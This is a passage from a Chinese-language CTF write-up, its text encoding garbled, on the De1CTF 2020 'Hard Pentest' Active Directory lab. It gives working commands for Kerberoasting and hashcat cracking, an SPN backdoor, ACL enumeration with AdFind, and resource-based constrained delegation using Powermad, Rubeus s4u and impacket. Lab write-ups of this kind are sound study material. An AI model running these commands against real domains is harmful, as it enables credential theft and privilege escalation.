<h4 id="2-è¯·æ±‚æ‰€æœ‰TGS"><a href="#2-è¯·æ±‚æ‰€æœ‰TGS" class="headerlink" title="(2)è¯·æ±‚æ‰€æœ‰TGS"></a>(2)è¯·æ±‚æ‰€æœ‰TGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œåè¾“å…¥<code>klist</code>æŸ¥çœ‹å†…å­˜ä¸­çš„ç¥¨æ®ï¼Œå¯æ‰¾åˆ°è·å¾—çš„TGS</p>
<h3 id="3ã€å¯¼å‡º"><a href="#3ã€å¯¼å‡º" class="headerlink" title="3ã€å¯¼å‡º"></a>3ã€å¯¼å‡º</h3><p>ä½¿ç”¨mimikatz</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>

<h3 id="4ã€ç ´è§£"><a href="#4ã€ç ´è§£" class="headerlink" title="4ã€ç ´è§£"></a>4ã€ç ´è§£</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;tgsrepcrack.py wordlist.txt test.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x05-Kerberoastingçš„å®ç°æ–¹æ³•äºŒ"><a href="#0x05-Kerberoastingçš„å®ç°æ–¹æ³•äºŒ" class="headerlink" title="0x05 Kerberoastingçš„å®ç°æ–¹æ³•äºŒ"></a>0x05 Kerberoastingçš„å®ç°æ–¹æ³•äºŒ</h2><hr>
<p>è‡ªåŠ¨å®ç°ï¼Œå¹¶ä¸”ä¸éœ€è¦mimikatzï¼Œæ™®é€šç”¨æˆ·æƒé™å³å¯ï¼Œå‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
<p>ä»£ç åœ°å€ï¼š</p>
<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
<p>ä½¿ç”¨<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>è¯·æ±‚TGSï¼Œåœ¨è¿”å›ç»“æœä¸­æå–å‡ºTGSï¼Œè¾“å‡ºçš„TGSå¯é€‰æ‹©John the Ripperæˆ–Hashcatè¿›è¡Œç ´è§£</p>
<p>å®ä¾‹æ¼”ç¤ºï¼š</p>
<p>åœ¨åŸŸå†…ä¸€å°ä¸»æœºä¸Šä»¥æ™®é€šç”¨æˆ·æƒé™æ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure>

<p>-AdminCountè¡¨ç¤ºé€‰æ‹©é«˜æƒé™çš„ç”¨æˆ·</p>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-2.png" alt="Alt text"></p>
<p>åªæå–å‡ºhashçš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœå¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-3.png" alt="Alt text"></p>
<p>ä½¿ç”¨hashcatç ´è§£çš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force</span><br></pre></td></tr></table></figure>

<p>ç ´è§£ç»“æœå¦‚ä¸‹å›¾ï¼ŒæˆåŠŸè·å¾—æ˜æ–‡å£ä»¤<code>MySQLAdmin111!</code></p>
<p><img src="/2020/05/09/De1ctf-pentest2/2-4.png" alt="Alt text"></p>
<p><strong>æ³¨ï¼š</strong></p>
<p>Rubeusä¹Ÿå¯ä»¥å®ç°Invoke-Kerberoastçš„åŠŸèƒ½ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>
<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
<p>å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoastingçš„åé—¨åˆ©ç”¨"><a href="#0x06-Kerberoastingçš„åé—¨åˆ©ç”¨" class="headerlink" title="0x06 Kerberoastingçš„åé—¨åˆ©ç”¨"></a>0x06 Kerberoastingçš„åé—¨åˆ©ç”¨</h2><hr>
<p>åœ¨æˆ‘ä»¬å–å¾—äº†SPNçš„ä¿®æ”¹æƒé™åï¼Œå¯ä»¥ä¸ºæŒ‡å®šçš„åŸŸç”¨æˆ·æ·»åŠ ä¸€ä¸ªSPNï¼Œè¿™æ ·å¯ä»¥éšæ—¶è·å¾—è¯¥åŸŸç”¨æˆ·çš„TGSï¼Œç»è¿‡ç ´è§£åè·å¾—æ˜æ–‡å£ä»¤</p>
<p>ä¾‹å¦‚ä¸ºåŸŸç”¨æˆ·<code>Administrator</code>æ·»åŠ <code>SPNVNC/DC1.test.com</code>ï¼Œå‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -U -A VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/3-1.png" alt="Alt text"></p>
<p>åœ¨åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºéƒ½èƒ½è·å¾—è¯¥SPNï¼Œå¹¶ä¸”èƒ½å¤Ÿä½¿ç”¨Kerberoastè·å¾—TGSï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="/2020/05/09/De1ctf-pentest2/3-2.png" alt="Alt text"></p>
<p>å†ä½¿ç”¨hashcatç ´è§£å³å¯</p>
<p><strong>è¡¥å……ï¼š</strong></p>
<p>åˆ é™¤SPNçš„å‚æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -D VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
</blockquote>
<p>è¿™é‡Œç”¨rubeus.exeè¿›è¡ŒKerberoastongæ”»å‡»ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506201311011.png" alt="image-20200506201311011"></p>
<p>æ‹¿åˆ°De1taçš„spn hash,ç„¶åç”¨hashcatæš´åŠ›ç ´è§£hashï¼Œå¯¹åº”çš„å‘½ä»¤å¦‚ä¸‹ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 de1ta_spn.txt ?h?h?h?h?h?h?h?h</span><br><span class="line">-a 3 è¡¨ç¤ºæ©ç æ”»å‡» </span><br><span class="line">-m 13100 Kerberos 5 TGS-REP etype 23</span><br><span class="line">åé¢æ˜¯æ©ç å­—ç¬¦é›†</span><br><span class="line">hashcat ç”¨æ³•å¯ä»¥å‚è€ƒhttps:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4008</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506212238198.png" alt="image-20200506212238198"></p>
</blockquote>
<p>è¿˜å¯ä»¥è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*De1ta$De1CTF2020.lab$http&#x2F;DM.De1CTF2020.lab*$61050147501E33CBDD5989D54AF1DF7B$346869F1DD94F400AE5C9925D03AA79F11B114AA6304B1ADAA7527796F7A80B4A21D1C0 FD329739F4572C9F0FC05622195960B66199E632715E616A79A92C3EB2CDF16EBB4A48575B3C6138065B2DCF544550C4A670FC5F3A55E61E2FE66762672ABFB9DA87018D91A2BED79EA50FA2AEB3E710339A2A733DDAEBC9017E49019132F99DCC626444E9F91885F539AB23BBB1AD082446B567B8FD29C72708FE6B56252CEA3BE85EACD0433644E9E99E2C8A8930FBB6043E1CD18054E4C948BBB5F0C5F3C9E2EA85E305079CC8CC38049AF88D37AE6211D75A3D06092350799BFFC23B9C4B1EE2BB1C586241374A23170B8F44E64E7A9B6101B780D28ACE1CB67152D54756EF57C21326E1C96B73680E5D495897F6086BBEDA269013C32C27C9029F11746B2B3F2AADFFB1831FA6761020894A81633FD5F8171D49EFDCEA0F89D696C3901A0A62F533BAC8CEDFD7BA77C6FBE095C1383A177D51C46603BDC236EBEF958FA9955226FDB551C0AC76EBDB4575782E215F7C05B1727107EC4B5468C92D3414BA53659E1A6A53F2E8608D9696AB0E11F32658DD9012AF96B74B2B8DE441FFADA666FA30012636B21C0AD46576F30467FD9C8923BEF4A9F37FCD4142E03423F692E7F9C36BD3626E3AA066C3254EADA1BDEB7B51B2EB256A4B79235D5854401CC9F73290352E550E41CE23C394A93FCBFBE35C398145E75FA64F1CE09A0B866F401B79351122DFCB1096999C879334C8D95F5B41601C713D6DA4ECB024D55680E8E71BED081EA48152561770DE047EBE017B10615A3DF335B3432718E3D000ECBBD21EFECF0D705B15C67763B4841BFA4EE6C78ED823B3A039E159DC16E024972E6EDFC7BE3057DF2EBA5C37274AE8753AA3675E02E5C52F8ABFFAD4B1B2DD97613092269E28370609DC24F295F5B769BED8AB95BE971B12B60608BCFB191BAC206D56AF13D5793B3F795AED53F7DF5D80056BC7799E223F7627EC8572AF324613813A8DBC78CC6DDAF85148A99C05BF802F63E64A77DE4BB9A0DC8B7DCDA97B80CDFCE0138EE81B1808F8F8BB4AAD3EF9CABAE504699F86938325C9D8C181FA66C95C986AE9D34D7B3DD15F2FAA29149815D3581F6462508D81D4A275F128A38C1DC8CEB54C2B8B98445DDE60C7469B598C172278A0BB6E17967998131712B55ACD27F0369133140E57A100CECB2625402F23CA3F246EACEEE638F1BC518CD0EDBA8B94492795833B1DB5D9F7C46DC4EA6014C750276F07190F181951918F028FB0CA4CB1617FC5E5EF7DBCD09D59E26C76B6AA7CC36D5A2EBF8670E018CCC1E3BE7E1D58E6FC798323421A3424562B9E14B325E50B36B14C8A4B3F42B43CF40DD73DF235F1B87FA6F2578767739608791CF4706140F02CE03F523A06069DA1C293E9BED7B188EEF41 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure>

<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506212308372.png" alt="image-20200506212308372"></p>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506224335368.png" alt="image-20200506224335368"></p>
<p>å‰é¢å·²ç»æç¤ºäº†De1taæœ‰ç‰¹æ®Šçš„æ‰©å±•æƒé™ï¼Œç„¶åå†ç”¨adfindå»æŸ¥çœ‹De1taçš„aclæƒé™</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br><span class="line">AdFind.exe -s subtree -b "dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506085227520.png" alt="image-20200506085227520"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506224719242.png" alt="image-20200506224719242"></p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šå›¾æ¡†ä¸­çš„ä¸‰ä¸ªæƒé™(Add/Remove Replica In Domainã€Replication Synchronizationã€Manage Replication Topology)ï¼Œå¤§ä½¬è¯´ä¸Šé¢ä¸‰ä¸ªæƒé™å¯ä»¥è¿›è¡ŒDCShadowæ”»å‡»ï¼Œå…·ä½“æ”»å‡»åŸç†å¯ä»¥çœ‹<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>è¿™ç¯‡æ–‡ç« ï¼Œ</p>
<blockquote>
<p>ä½†æ˜¯å•å•ä¸‰ä¸ªæƒé™è¿˜æ˜¯ä¸æ»¡è¶³Dcshadowçš„æ¡ä»¶çš„ï¼Œè¿˜è¦å¯¹å½“å‰ä¸»æœºå±æ€§å…·æœ‰å†™æƒé™ä»¥åŠå¯¹<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>å®¹å™¨å…·æœ‰<code>Create Child</code>å’Œ<code>Delete Chind</code>æƒé™ã€‚ç„¶åå†æ”¶é›†ä¸€æ³¢ç›¸å…³çš„ACL</p>
<p>å‘ç°De1taç”¨æˆ·å¯¹<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>å®¹å™¨å…·æœ‰<code>Create Child</code>å’Œ<code>Delete Chind</code>æƒé™</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=sites,cn=Configuration,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506225825119.png" alt="image-20200506225825119"></p>
<p>ç»§ç»­æŸ¥çœ‹De1taå¯¹å½“å‰ä¸»æœºDMå±æ€§å…·æœ‰å†™æƒé™ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509171231727.png" alt></p>
<p>å³å¯è¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=dm,cn=computers,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506225952439.png" alt="image-20200506225952439"></p>
<p>ç„¶åé€šè¿‡åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å¯¹å½“å‰ä¸»æœºè¿›è¡Œæœ¬åœ°ææƒã€‚<a href="http://redteam.today/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" target="_blank" rel="noopener">è¯¦ç»†åŸç†å‚è€ƒ</a>ï¼Œå¦å¤–è¿˜æœ‰è§†é¢‘<a href="https://www.youtube.com/watch?v=RUbADHcBLKg" target="_blank" rel="noopener">æ“ä½œ</a></p>
<p>è¿™é‡Œé¦–å…ˆç”¨klist purgeå‘½ä»¤æŠŠç™»å½•ä¼šè¯çš„æ‰€æœ‰ç¥¨è¯æ¸…ç©ºï¼Œç„¶å</p>
<blockquote>
<p>klistè¯­æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist [-lh &lt;LogonId.HighPart&gt;] [-li &lt;LogonId.LowPart&gt;] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507230043568.png" alt="image-20200508082613787"></p>
<p>ä¹‹åè¯·æ±‚ä¸€ä¸ªTGT,å¹¶å¯¼å…¥ä¼šè¯ä¸­ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:de1ta &#x2F;password:3f23ea12 &#x2F;domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508082613787.png" alt></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225359017.png" alt="image-20200507225359017"></p>
<p>ç„¶åklistæŸ¥è¯¢ä¸‹ç¥¨æ®ï¼Œå¯ä»¥çœ‹è§</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225504011.png" alt="image-20200507225504011"></p>
<p>ä¹‹åå‚è€ƒè¿™ç¯‡<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">æ–‡ç« </a>ï¼Œè¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»ï¼Œé¦–å…ˆä½¿ç”¨<a href="https://github.com/Kevin-Robertson" target="_blank" rel="noopener">Kevin-Robertson</a>/<strong><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a></strong>æ¥æ·»åŠ ä¸€ä¸ªè´¦å·</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount mount -Password $(ConvertTo-SecureString "mount" -AsPlainText -Force)  </span><br><span class="line"><span class="meta">#</span><span class="bash">ä¸‹å›¾ä¸ºevil,å¯¹åº”æ”¹æˆmountå³å¯</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507231145442.png" alt="image-20200507231145442"></p>
<p>ç„¶ååˆ©ç”¨powerviewçš„Get-DomainComputerå¾—åˆ°mountçš„sidã€‚</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508083733914.png" alt="image-20200508083733914"></p>
<p>ç„¶åè®¾ç½®DMçš„msds-allowedtoactonbehalfofotheridentityå±æ€§ï¼Œæ·»åŠ æ–°å»ºçš„mountï¼Œè¾¾åˆ°å¯ä»¥è®©mountå¯ä»¥æ¨¡æ‹Ÿä»»æ„ç”¨æˆ·è®¿é—®DMçš„æœåŠ¡ï¼Œå³åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»è¿›è¡Œææƒã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1129)"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">SDBytes = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">SD.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);</span></span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091157144.png" alt="image-20200508091157144"></p>
<p>å¯ä»¥åˆ©ç”¨powerviewçš„å¦‚ä¸‹å‘½ä»¤æ¥æ£€æµ‹æ˜¯å¦è®¾ç½®æˆåŠŸï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">RawBytes = Get-DomainComputer DM -Properties <span class="string">'msds-allowedtoactonbehalfofotheridentity'</span> | select -expand msds-allowedtoactonbehalfofotheridentity; <span class="variable">$Descriptor</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="variable">$RawBytes</span>,0; <span class="variable">$Descriptor</span>.DiscretionaryAcl</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508100355469.png" alt="image-20200508100355469"></p>
<p>ç„¶ååœ¨ç”Ÿæˆå¯¹åº”çš„ç™½é“¶ç¥¨æ®ï¼ˆä¼ªé€ çš„tgsï¼‰,å‚è€ƒå…ˆçŸ¥çš„<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">æ–‡ç« è¦</a>åˆ†åˆ«ç”Ÿæˆï¼ˆcifs,hostï¼‰ä¸¤ä¸ªç¥¨æ®ï¼Œè¿™é‡Œé‡‡ç”¨rubeus.exeæ¥è¿›è¡ŒåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ©ç”¨ï¼Œå› ä¸ºrubeus.exeä¸æ”¯æŒæ˜æ–‡ï¼Œæ‰€ä»¥é¦–å…ˆç”Ÿæˆhashã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:mount /password:mount /domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508090928722.png" alt="image-20200508090928722"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:mount$ /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:Administrator /msdsspn:cifs/dm /ptt </span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /user:mount /rc4:A7BD777076A164E74E418F0913174929 /impersonateuser:administrator /msdsspn:host/dm /ptt </span><br><span class="line"><span class="meta">#</span><span class="bash">rubeusçš„ç”¨æ³•å‚è€ƒ https://github.com/GhostPack/Rubeus<span class="comment">#s4u</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091546798.png" alt="image-20200508091546798"></p>
<p>ä¹‹åklistæ£€æŸ¥ç¥¨æ®</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508091629160.png" alt="image-20200508091629160"></p>
<p>ç„¶åæµ‹è¯•æ•ˆæœ</p>
<img src="/2020/05/09/De1ctf-pentest2/image-20200509130415846.png" alt="image-20200509130415846" style="zoom:150%;">

<p>å¤±è´¥ï¼Œ<a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">çœ‹å‡ºé¢˜äººåšå®¢ä¹Ÿè¯´</a>rubeus çš„ä¸å¯ä»¥ï¼Œ</p>
<img src="/2020/05/09/De1ctf-pentest2/image-20200509130808887.png" alt="image-20200509130808887" style="zoom:150%;">

<p>ç„¶åå¼€å§‹ç”¨impacketï¼Œè¿™é‡Œè¦ç”¨pyinstalleræŠŠimpacketçš„ç¨‹åºæ‰“åŒ…ï¼Œgithubä¸Šé¢ä¹Ÿæœ‰ç°æˆçš„ï¼Œ</p>
<blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getST.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"><span class="meta">$</span><span class="bash">env:KRB5CCNAME=<span class="string">"Administrator.ccache"</span></span></span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/mount:mount</span><br><span class="line"></span><br><span class="line">setenv KRB5CCNAME  Administrator.ccache</span><br><span class="line"></span><br><span class="line">wmiexec.exe -no-pass -k -debug dm shell.exe</span><br><span class="line"><span class="meta">#</span><span class="bash">æˆ–</span></span><br><span class="line">smbexec.exe -no-pass -k -debug dm  </span><br><span class="line"><span class="meta">#</span><span class="bash">æˆ–</span></span><br><span class="line">PsExec64.exe  \\dm -s cmd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‚æ•°ï¼š</p>
<p>-impersonateï¼šè¡¨ç¤ºä¼ªé€ ç”¨æˆ·</p>
<p>-spnï¼šè¡¨ç¤ºæˆ‘ä»¬è¦å§”æ´¾çš„æœåŠ¡çš„spnï¼Œè¿™é‡Œæ˜¯cifs</p>
<p>-dc-ipï¼šåŸŸæ§ip</p>
<p>æ‰§è¡Œä¹‹åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªç¼“å­˜æ–‡ä»¶Administrator.ccache</p>
<p>-no-pass</p>
</blockquote>
<p>æ‰§è¡Œwmiexec.exeç­‰éƒ½æ²¡æœ‰æˆåŠŸï¼Œç„¶ååˆ©ç”¨mimikatz.exeæŠŠAdministrator.ccacheå¯¼å…¥ä¼šè¯ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell mimikatz.exe &quot;privilege::debug&quot;  &quot;kerberos::ptc Administrator.ccache&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509141628302.png" alt="image-20200509141628302"></p>
<p>ç„¶ååœ¨è¿è¡Œï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509141847581.png" alt="image-20200509141847581"></p>
<p>å‡ºç°è¿™ä¸ªé”™è¯¯åŸå› å¯èƒ½<a href="http://t3ngyu.leanote.com/tag/Pth" target="_blank" rel="noopener">æ˜¯</a>ä»€ä¹ˆç»„å†Œè¡¨ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œè¦æ”¹æ³¨å†Œè¡¨ï¼Œä½†æ˜¯æ— æƒé™ï¼Œpthå§ï¼Œæ²¡æœ‰administratorçš„hashï¼Œçˆ¬ã€‚</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f </span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¹‹åå°è¯•å†…ç½‘ç©¿é€ï¼Œç”¨frpæŒ‚ä¸Šä»£ç†ï¼Œç„¶åï¼Œè¿˜æ˜¯å¤±è´¥ï¼Œå¥½åƒæœ¬åœ°è§£æä¸äº†dmï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509143858857.png" alt="image-20200509143858857"></p>
<p>ç„¶åå°±æ²¡åŠæ³•å¤ç°ä¸‹å»äº†ï¼Œæœ‰å¸ˆå‚…åšå‡ºæ¥çš„å¯ä»¥è¯„è®ºå‘Šè¯‰æˆ‘è¿™ä¸ªèœé¸¡ï¼Œæˆ‘å“ªé‡Œé™¤äº†é—®é¢˜ï¼Œå¤ªèœäº†ã€‚</p>
<p>ä¹‹åå‚è€ƒäº†n1ntyå¤§ä½¬(<a href="https://mp.weixin.qq.com/s/gw1EIMnXQ9tCZLkdvKdzAg)[æ–‡ç« ](https://paper.seebug.org/620/#s4u-service-for-user)" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gw1EIMnXQ9tCZLkdvKdzAg)[æ–‡ç« ](https://paper.seebug.org/620/#s4u-service-for-user)</a></p>
<blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509193504323.png" alt="image-20200509193504323"></p>
</blockquote>
